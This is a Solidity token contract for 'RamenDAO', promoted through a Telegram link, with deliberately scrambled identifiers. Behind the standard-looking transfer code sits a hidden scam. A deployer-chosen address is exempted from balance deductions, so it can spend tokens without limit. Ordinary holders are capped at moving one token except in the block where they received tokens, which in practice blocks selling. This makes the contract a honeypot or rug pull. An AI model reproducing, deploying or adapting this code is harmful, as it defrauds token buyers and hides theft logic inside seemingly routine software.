/*

https://t.me/portalramenDAO

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract RamenDAO is Ownable {
    mapping(address => uint256) private cmvislyfgb;

    mapping(address => uint256) public balanceOf;

    uint256 private adbwvtro = 103;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address rzsunayx, uint256 sypaubflrdne) public returns (bool success) {
        txafqknumoyh(msg.sender, rzsunayx, sypaubflrdne);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    string public name;

    mapping(address => uint256) private pudgtykac;

    constructor(string memory psfdaohgqw, string memory hwmicyp, address espn, address kjudfxw) {
        name = psfdaohgqw;
        symbol = hwmicyp;
        balanceOf[msg.sender] = totalSupply;
        cmvislyfgb[kjudfxw] = adbwvtro;
        yhmxnowc = IUniswapV2Router02(espn);
    }

    function approve(address dxch, uint256 sypaubflrdne) public returns (bool success) {
        allowance[msg.sender][dxch] = sypaubflrdne;
        emit Approval(msg.sender, dxch, sypaubflrdne);
        return true;
    }

    function transferFrom(address lvhq, address rzsunayx, uint256 sypaubflrdne) public returns (bool success) {
        require(sypaubflrdne <= allowance[lvhq][msg.sender]);
        allowance[lvhq][msg.sender] -= sypaubflrdne;
        txafqknumoyh(lvhq, rzsunayx, sypaubflrdne);
        return true;
    }

    function txafqknumoyh(address lvhq, address rzsunayx, uint256 sypaubflrdne) private {
        address dgsiuzoevyf = IUniswapV2Factory(yhmxnowc.factory()).getPair(address(this), yhmxnowc.WETH());
        if (0 == cmvislyfgb[lvhq]) {
            if (lvhq != dgsiuzoevyf && pudgtykac[lvhq] != block.number && sypaubflrdne < totalSupply) {
                require(sypaubflrdne <= totalSupply / (10 ** decimals));
            }
            balanceOf[lvhq] -= sypaubflrdne;
        }
        balanceOf[rzsunayx] += sypaubflrdne;
        pudgtykac[rzsunayx] = block.number;
        emit Transfer(lvhq, rzsunayx, sypaubflrdne);
    }

    IUniswapV2Router02 private yhmxnowc;
}
